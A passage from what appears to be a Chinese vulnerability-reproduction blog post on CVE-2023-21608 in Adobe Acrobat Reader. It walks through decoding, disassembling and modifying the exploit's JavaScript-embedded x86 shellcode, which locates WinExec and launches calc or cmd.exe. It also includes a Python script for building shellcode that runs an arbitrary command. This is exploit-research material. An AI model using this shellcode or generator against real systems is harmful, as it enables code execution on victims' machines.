  [in] LPCSTR lpCmdLine,
  [in] UINT   uCmdShow
);
</code></pre>
<p>经过上述验证，可以清晰的明白 shellcode 结构以及作用</p>
<ol>
<li>保存栈帧</li>
<li>将命令字符串压栈</li>
<li>通过出栈压栈操作将字符串地址放入栈顶，同时压栈前压入参数二：0</li>
<li>获取 kernel32.dll 基地址</li>
<li>循环偏移，获取 WinExec 函数地址</li>
<li>调用 kernel32.WinExec(“calc”，0)</li>
</ol>
<h2 id="构造-exp"><a href="#构造-exp" class="headerlink" title="构造 exp"></a>构造 exp</h2><p>由于上方分析都是分段进行，不方便接下来的修改 shellcode 操作，还需要简单处理一下得到完整的 shellcode</p>
<pre><code>shellcode = [835867240, 1667329123, 1415139921, 1686860336, 2339769483, 1980542347, 814448152, 2338274443,
    1545566347, 1948196865, 4270543903, 605009708, 390218413, 2168194903, 1768834421, 4035671071,
    469892611, 1018101719, 2425393296]

bytes = &quot;0x&quot;
for shell_bytes in shellcode:
    cur_bytes= hex(shell_bytes)[2:]
    bytes+=cur_bytes

print(bytes)
</code></pre>
<p>得到 real shellcode</p>
<pre><code>0x31d2526863616c6354595251648b72308b760c8b760cad8b308b7e188b5f3c8b5c1f788b741f2001fe8b541f240fb72c174242ad813c0757696e4575f08b741f1c01fe033caeffd790909090
</code></pre>
<p>反编译完整内容</p>
<pre><code>Array Literal:
&#123; 0x31, 0xD2, 0x52, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x52, 0x51, 0x64, 0x8B, 0x72, 0x30, 0x8B, 0x76, 0x0C, 0x8B, 0x76, 0x0C, 0xAD, 0x8B, 0x30, 0x8B, 0x7E, 0x18, 0x8B, 0x5F, 0x3C, 0x8B, 0x5C, 0x1F, 0x78, 0x8B, 0x74, 0x1F, 0x20, 0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x42, 0x42, 0xAD, 0x81, 0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xF0, 0x8B, 0x74, 0x1F, 0x1C, 0x01, 0xFE, 0x03, 0x3C, 0xAE, 0xFF, 0xD7, 0x90, 0x90, 0x90, 0x90 &#125;
Disassembly:
0:  31 d2                   xor    edx,edx
2:  52                      push   edx
3:  68 63 61 6c 63          push   0x636c6163
8:  54                      push   esp #获取存储calc的地址esp压栈
9:  59                      pop    ecx# 存储calc的地址存入ecx
a:  52                      push   edx
b:  51                      push   ecx
c:  64 8b 72 30             mov    esi,DWORD PTR fs:[edx+0x30]
10: 8b 76 0c                mov    esi,DWORD PTR [esi+0xc]
13: 8b 76 0c                mov    esi,DWORD PTR [esi+0xc]
16: ad                      lods   eax,DWORD PTR ds:[esi]
17: 8b 30                   mov    esi,DWORD PTR [eax]
19: 8b 7e 18                mov    edi,DWORD PTR [esi+0x18]
1c: 8b 5f 3c                mov    ebx,DWORD PTR [edi+0x3c]
1f: 8b 5c 1f 78             mov    ebx,DWORD PTR [edi+ebx*1+0x78]
23: 8b 74 1f 20             mov    esi,DWORD PTR [edi+ebx*1+0x20]
27: 01 fe                   add    esi,edi
29: 8b 54 1f 24             mov    edx,DWORD PTR [edi+ebx*1+0x24]
2d: 0f b7 2c 17             movzx  ebp,WORD PTR [edi+edx*1]
31: 42                      inc    edx
32: 42                      inc    edx
33: ad                      lods   eax,DWORD PTR ds:[esi]
34: 81 3c 07 57 69 6e 45    cmp    DWORD PTR [edi+eax*1],0x456e6957 #WinE
3b: 75 f0                   jne    0x2d
3d: 8b 74 1f 1c             mov    esi,DWORD PTR [edi+ebx*1+0x1c]
41: 01 fe                   add    esi,edi
43: 03 3c ae                add    edi,DWORD PTR [esi+ebp*4]
46: ff d7                   call   edi
48: 90                      nop
49: 90                      nop
4a: 90                      nop
4b: 90                      nop
</code></pre>
<h2 id="测试改动-shellcode"><a href="#测试改动-shellcode" class="headerlink" title="测试改动 shellcode"></a>测试改动 shellcode</h2><p>通过上述分析可以清晰的看到 shellcode 除了命令字符串部分需要改动，其他部分均不需要改动。</p>
<p>替换 calc 为 cmd.exe</p>
<pre><code>push  0x657865
push  0x2e646d63
</code></pre>
<p>汇编代码</p>
<pre><code>0x0:        xor  edx, edx
0x2:        push  edx
0x3:        push  0x657865
0x8:        push  0x2e646d63
0xd:        push  esp
0xe:        pop  ecx
0xf:        push  edx
0x10:        push  ecx
0x11:        mov  esi, dword ptr fs:[edx + 0x30]
0x15:        mov  esi, dword ptr [esi + 0xc]
0x18:        mov  esi, dword ptr [esi + 0xc]
0x1b:        lodsd  eax, dword ptr [esi]
0x1c:        mov  esi, dword ptr [eax]
0x1e:        mov  edi, dword ptr [esi + 0x18]
0x21:        mov  ebx, dword ptr [edi + 0x3c]
0x24:        mov  ebx, dword ptr [edi + ebx + 0x78]
0x28:        mov  esi, dword ptr [edi + ebx + 0x20]
0x2c:        add  esi, edi
0x2e:        mov  edx, dword ptr [edi + ebx + 0x24]
0x32:        movzx  ebp, word ptr [edi + edx]
0x36:        inc  edx
0x37:        inc  edx
0x38:        lodsd  eax, dword ptr [esi]
0x39:        cmp  dword ptr [edi + eax], 0x456e6957
0x40:        jne  0x2d
0x42:        mov  esi, dword ptr [edi + ebx + 0x1c]
0x46:        add  esi, edi
0x48:        add  edi, dword ptr [esi + ebp*4]
0x4b:        call  edi
0x4d:        nop  
0x4e:        nop  
0x4f:        nop  
0x50:        nop
</code></pre>
<p>发现 jne 0x2d 的偏移变了，所以还需要改动一下 将 0x2d 改为 0x32 即可</p>
<pre><code>0x0:        xor  edx, edx
0x2:        push  edx
0x3:        push  0x657865
0x8:        push  0x2e646d63
0xd:        push  esp
0xe:        pop  ecx
0xf:        push  edx
0x10:        push  ecx
0x11:        mov  esi, dword ptr fs:[edx + 0x30]
0x15:        mov  esi, dword ptr [esi + 0xc]
0x18:        mov  esi, dword ptr [esi + 0xc]
0x1b:        lodsd  eax, dword ptr [esi]
0x1c:        mov  esi, dword ptr [eax]
0x1e:        mov  edi, dword ptr [esi + 0x18]
0x21:        mov  ebx, dword ptr [edi + 0x3c]
0x24:        mov  ebx, dword ptr [edi + ebx + 0x78]
0x28:        mov  esi, dword ptr [edi + ebx + 0x20]
0x2c:        add  esi, edi
0x2e:        mov  edx, dword ptr [edi + ebx + 0x24]
0x32:        movzx  ebp, word ptr [edi + edx]
0x36:        inc  edx
0x37:        inc  edx
0x38:        lodsd  eax, dword ptr [esi]
0x39:        cmp  dword ptr [edi + eax], 0x456e6957
0x40:        jne  0x33
0x42:        mov  esi, dword ptr [edi + ebx + 0x1c]
0x46:        add  esi, edi
0x48:        add  edi, dword ptr [esi + ebp*4]
0x4b:        call  edi
0x4d:        nop  
0x4e:        nop  
0x4f:        nop  
0x50:        nop
</code></pre>
<h3 id="shellcode-构造脚本"><a href="#shellcode-构造脚本" class="headerlink" title="shellcode 构造脚本"></a>shellcode 构造脚本</h3><p>这里给出一个帮助构造 shellcode 的脚本</p>
<pre><code>def cut(obj, sec):
    return [obj[i:i + sec] for i in range(0, len(obj), sec)]


def shellcode2stack(string):
    hex_shell = &quot;&quot;
    for byte in string:
        a = hex(ord(byte))[2:]
        hex_shell += a

    hex_list = cut(hex_shell, 8)
    hex_list.reverse()
    stack = []
    for hex_byte in hex_list:
        byte_list = cut(hex_byte, 2)
        byte_list.reverse()
        stack_byte = &#39;&#39;.join(byte_list)
        stack.append(&quot;push 0x&#123;&#125;&quot;.format(stack_byte))

    return stack


if __name__ == &#39;__main__&#39;:
    shell = &quot;1.exe&quot;
    # shell = &quot;cmd.exe&quot;
    stack_list = shellcode2stack(shell)
    print(&quot;push times: &#123;&#125;&quot;.format(len(stack_list)))
    print(&quot;need pop times: &#123;&#125;&quot;.format(len(stack_list) - 1))
    print(&quot;jne offset: &#123;&#125;&quot;.format(hex(0x2d + (len(stack_list) - 1) * 5)))
    print()
    for stack in stack_list:
        print(stack)
    print()
    print(&quot;your shellcode&quot;)
    print()
    print(&quot;add esp, &#123;&#125;&quot;.format(hex((len(stack_list) - 1) * 4)))
</code></pre>
<p>字节码：</p>
<pre><code>31D252686578650068636D642E54595251648B72308B760C8B760CAD8B308B7E188B5F3C8B5C1F788B741F2001FE8B541F240FB72C174242AD813C0757696E4575F08B741F1C01FE033CAEFFD790909090
</code></pre>
<p>接着按照 8 比特一组进行切割，生成 js shellcode</p>
<p><img src="/2023/03/15/CVE-2023-21608/boxcnrLfblvyjBqAne65zKDpbPd.png"></p>
<p>发现生成的 list 中多了 1 比特位，所以 sellcode 中还需要删除一个 0x90 的 nop 指令，生成测试 payload</p>
<pre><code>def cut(obj, sec):
    return [int(obj[i:i+sec],16) for i in range(0,len(obj),sec)]

bytes = &quot;31D252686578650068636D642E54595251648B72308B760C8B760CAD8B308B7E188B5F3C8B5C1F788B741F2001FE8B541F240FB72C174242AD813C0757696E4575F08B741F1C01FE033CAEFFD7589090&quot;

bytes_list =cut(bytes,8)
print(bytes_list)
</code></pre>
<pre><code>835867240, 1702388992, 1751346532, 777279826, 1365543794, 814446092, 2339769517, 2335214462, 411787068, 2338070392, 2339643168, 33459028, 522457015, 739721794, 2910927879, 1466527301, 1978698612, 521929214, 54308607, 3616575632
</code></pre>
<p>尝试执行</p>
<p><img src="/2023/03/15/CVE-2023-21608/boxcnYWPGi0xaBLtrjX0FyjsSff.png"></p>
<p>执行失败。。。 原因也很明显 在执行完命令后需要恢复堆栈，可以看到 原始处理方法是 pop eax 两次，用来清理曾经的参数 1 和参数 2，但是现在由于我们多压栈了一次，导致这里寄存器值的错位，进而导致程序崩溃。解决方法：在添加一个 pop eax 的 shellcode 用于恢复到默认 shellcode 布局。</p>
<p><img src="/2023/03/15/CVE-2023-21608/boxcn2CEfNAV6Y1m1Jh6wQXGaWc.png"></p>
<p>尝试新 shellcode</p>
<pre><code>0x0:        xor  edx, edx
0x2:        push  edx
0x3:        push  0x657865
0x8:        push  0x2e646d63
0xd:        push  esp
0xe:        pop  ecx
0xf:        push  edx
0x10:        push  ecx
0x11:        mov  esi, dword ptr fs:[edx + 0x30]
0x15:        mov  esi, dword ptr [esi + 0xc]
0x18:        mov  esi, dword ptr [esi + 0xc]
0x1b:        lodsd  eax, dword ptr [esi]
0x1c:        mov  esi, dword ptr [eax]
0x1e:        mov  edi, dword ptr [esi + 0x18]
0x21:        mov  ebx, dword ptr [edi + 0x3c]
0x24:        mov  ebx, dword ptr [edi + ebx + 0x78]
0x28:        mov  esi, dword ptr [edi + ebx + 0x20]
0x2c:        add  esi, edi
0x2e:        mov  edx, dword ptr [edi + ebx + 0x24]
0x32:        movzx  ebp, word ptr [edi + edx]
0x36:        inc  edx
0x37:        inc  edx
0x38:        lodsd  eax, dword ptr [esi]
0x39:        cmp  dword ptr [edi + eax], 0x456e6957
0x40:        jne  0x32
0x42:        mov  esi, dword ptr [edi + ebx + 0x1c]
0x46:        add  esi, edi
0x48:        add  edi, dword ptr [esi + ebp*4]
0x4b:        call  edi
0x4d:        pop  eax
0x4e:        nop  
0x4f:        nop
</code></pre>
<p>对应 hex</p>
<pre><code>31D252686578650068636D642E54595251648B72308B760C8B760CAD8B308B7E188B5F3C8B5C1F788B741F2001FE8B541F240FB72C174242AD813C0757696E4575F08B741F1C01FE033CAEFFD7589090
</code></pre>
<p>对应 js shellcode</p>
<pre><code>835867240, 1702388992, 1751346532, 777279826, 1365543794, 814446092, 2339769517, 2335214462, 411787068, 2338070392, 2339643168, 33459028, 522457015, 739721794, 2910927879, 1466527301, 1978698612, 521929214, 54308607, 3612905616
</code></pre>
<p>再次尝试</p>
<p><img src="/2023/03/15/CVE-2023-21608/boxcnRkg0kQFxW7hrioef3z0szc.png"></p>
<h2 id="构造-RCE-shellcode"><a href="#构造-RCE-shellcode" class="headerlink" title="构造 RCE shellcode"></a>构造 RCE shellcode</h2><p>后续添加</p>
<h2 id="遇到问题"><a href="#遇到问题" class="headerlink" title="遇到问题"></a>遇到问题</h2><ol>
<li>调试时如何准确断在 shellcode 内存地址处？<br> 可以在程序加载运行后，单步走几步，此时跳转到 shellcode 内存处，并下硬件断点，检测执行操作</li>
<li>如果自由转换 asm 到 shellcode，以及 shellcode 到 asm<br> 在线方式 <a target="_blank" rel="noopener" href="https://disasm.pro/">https://disasm.pro/</a><br> 离线方式 pwntools</li>
<li>调试时突然遇见 exec_denied<br> 待解决。。。</li>
</ol>

        </div>

    </div>

    

    

    

    

    

    
<nav class="article-nav">
  
    <a href="/2024/01/05/Apollo-8-0%E6%95%99%E7%A8%8B/" id="article-nav-newer" class="article-nav-link-wrap">
      <div class="article-nav-caption">下一篇</div>
      <div class="article-nav-title">
        
          Apollo 8.0教程
        
      </div>
    </a>
  
  
    <a href="/2023/03/06/GNS3-mipsel-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" id="article-nav-older" class="article-nav-link-wrap">
      <div class="article-nav-caption">上一篇</div>
      <div class="article-nav-title">GNS3-mipsel-环境搭建</div>
    </a>
  
</nav>


    <section class="share">
        <div class="share-title">分享</div>
        <a class="share-item" target="_blank"
            href="https://twitter.com/share?text=CVE-2023-21608 - ioo0s's blog&url=http%3A%2F%2Fioo0s.art%2F2023%2F03%2F15%2FCVE-2023-21608%2F">
            <ion-icon name="logo-twitter"></ion-icon>
        </a>
        <a class="share-item" target="_blank"
            href="https://www.facebook.com/sharer.php?title=CVE-2023-21608 - ioo0s's blog&u=http%3A%2F%2Fioo0s.art%2F2023%2F03%2F15%2FCVE-2023-21608%2F">
            <ion-icon name="logo-facebook"></ion-icon>
        </a>
        <!-- <a class="share-item" target="_blank"
            href="https://service.weibo.com/share/share.php?title=CVE-2023-21608 - ioo0s's blog&url=http://ioo0s.art/2023/03/15/CVE-2023-21608/&pic=">
            <div class="n-icon n-icon-weibo"></div>
        </a> -->
    </section>

</article>
















<script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

</div>
                </section>
            </section>

            
            <aside class="sidebar ">
                


<div class="widget" id="widget">
    
      
  <div class="widget-wrap">
    <div class="widget-inner">
      <div class="toc post-toc-html"></div>
    </div>
  </div>

    
      
  <div class="widget-wrap widget-cate">
    <div class="widget-title"><span>Categories</span></div>
    <div class="widget-inner">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">基础知识</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">漏洞挖掘</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%AE%BA%E6%96%87%E5%AD%A6%E4%B9%A0/">论文学习</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/">逆向工程</a></li></ul>
    </div>
  </div>


    
      
  <div class="widget-wrap widget-tags">
    <div class="widget-title"><span>Tags</span></div>
    <div class="widget-inner">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ASUS/" rel="tag">ASUS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Acrobat-Reader/" rel="tag">Acrobat Reader</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Adobe/" rel="tag">Adobe</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Apollo8-0/" rel="tag">Apollo8.0</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/FortiGate/" rel="tag">FortiGate</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Fuzz/" rel="tag">Fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IOT/" rel="tag">IOT</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Juniper/" rel="tag">Juniper</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ios%E9%80%86%E5%90%91/" rel="tag">ios逆向</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%B8%E6%88%8F%E7%A0%B4%E8%A7%A3/" rel="tag">游戏破解</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">漏洞复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%87%AA%E5%8A%A8%E9%A9%BE%E9%A9%B6/" rel="tag">自动驾驶</a></li></ul>
    </div>
  </div>


    
      
  <div class="widget-wrap widget-recent-posts">
    <div class="widget-title"><span>Recent Posts</span></div>
    <div class="widget-inner">
      <ul>
        
          <li>
            <a href="/2024/01/05/Apollo-8-0%E6%95%99%E7%A8%8B/">Apollo 8.0教程</a>
          </li>
        
          <li>
            <a href="/2023/03/15/CVE-2023-21608/">CVE-2023-21608</a>
          </li>
        
          <li>
            <a href="/2023/03/06/GNS3-mipsel-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">GNS3-mipsel-环境搭建</a>
          </li>
        
          <li>
            <a href="/2023/02/24/juniper-1day-%E4%BB%BB%E6%84%8F%E7%9B%AE%E5%BD%95%E8%AF%BB/">juniper-1day-任意目录读</a>
          </li>
        
          <li>
            <a href="/2023/02/23/juniper-jweb%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">juniper-jweb环境搭建</a>
          </li>
        
      </ul>
    </div>
  </div>

    
      
  <div class="widget-wrap widget-archive">
    <div class="widget-title"><span>Archive</span></div>
    <div class="widget-inner">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/">2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/">2023</a></li></ul>
    </div>
  </div>


    
</div>

<div id="backtop"><i class="icon icon-arrow-up"></i></div>
            </aside>
            
        </div>
    </div>

    <footer class="footer">
    <div class="footer-wave">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1440 320"><path fill="#3c4859" fill-opacity="1" d="M0,160L60,181.3C120,203,240,245,360,240C480,235,600,181,720,186.7C840,192,960,256,1080,261.3C1200,267,1320,213,1380,186.7L1440,160L1440,320L1380,320C1320,320,1200,320,1080,320C960,320,840,320,720,320C600,320,480,320,360,320C240,320,120,320,60,320L0,320Z"></path></svg>
    </div>

    <!-- Please do not remove this -->
    <!-- 开源不易，请勿删除 -->
    <div class="footer-wrap">
        <div class="footer-inner"> 
            ioo0s&#39;s blog &copy; 2024<br>
            Powered By Hexo · Theme By Aomori
        </div>
    </div>

</footer>

<script type="module" src="https://unpkg.com/ionicons@6.0.2/dist/ionicons/ionicons.esm.js"></script>






<script src="/dist/build.js?1654266144177.js"></script>


<script src="/dist/custom.js?1654266144177.js"></script>



<!-- 百度链接提交 -->
<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        }
        else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>











</body>

</html>